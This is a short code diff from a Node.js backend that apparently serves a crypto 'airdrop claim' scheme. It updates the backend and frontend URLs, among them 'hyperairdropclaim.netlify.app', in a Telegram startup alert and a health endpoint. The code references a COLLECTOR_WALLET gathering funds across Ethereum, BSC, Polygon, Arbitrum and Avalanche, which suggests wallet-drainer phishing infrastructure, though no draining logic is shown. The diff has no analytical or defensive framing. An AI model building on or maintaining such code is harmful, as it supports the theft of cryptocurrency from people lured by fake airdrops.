@@ -115,8 +115,8 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🔗 Backend: hypeback.netlify.app\n` +
-      `🌍 Frontend: hyperairdropclaim.netlify.app\n` +
+      `🔗 Backend: https://hypeback.netlify.app\n` +
+      `🌍 Frontend: https://hyperairdropclaim.netlify.app\n` +
       `🕐 Started: ${new Date().toLocaleString()}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -163,7 +163,7 @@ app.get('/api/health', (req, res) => {
   res.json({ 
     success: true, 
     status: 'ACTIVE',
-    backend: 'https://hyperback-psi.vercel.app',
+    backend: 'https://hypeback.netlify.app',
     telegram: telegramEnabled ? 'connected' : 'disabled'
   });
 });
